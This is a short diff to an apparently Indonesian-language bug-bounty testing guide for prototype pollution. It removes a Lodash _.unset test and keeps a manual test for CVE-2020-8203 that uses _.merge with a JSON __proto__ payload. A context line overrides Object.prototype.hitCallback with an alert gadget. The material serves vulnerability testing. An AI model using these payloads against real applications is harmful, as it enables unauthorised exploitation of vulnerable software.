@@ -332,17 +332,13 @@ Object.prototype.hitCallback = function(){ alert('GA GADGET POLLUTED') }
 
 ## 🎯 BAGIAN 8: Tier 6 - CVE-Specific & Bug Bounty (NEW v3.5)
 
-### 8.1 Testing Lodash CVEs (CVE-2025-13465, CVE-2020-8203)
+### 8.1 Testing Lodash CVE (CVE-2020-8203)
 **Tools mendeteksi:** Vulnerable Lodash version.
 
 **Cara test manual:**
 ```javascript
-// CVE-2025-13465 (_.unset)
-const _ = require('lodash');
-_.unset({}, [['constructor'], 'prototype', 'polluted']);
-Object.prototype.polluted // "true" (jika vulnerable)
-
 // CVE-2020-8203 (_.merge)
+const _ = require('lodash');
 _.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
 ({}).polluted // "yes"
 ```
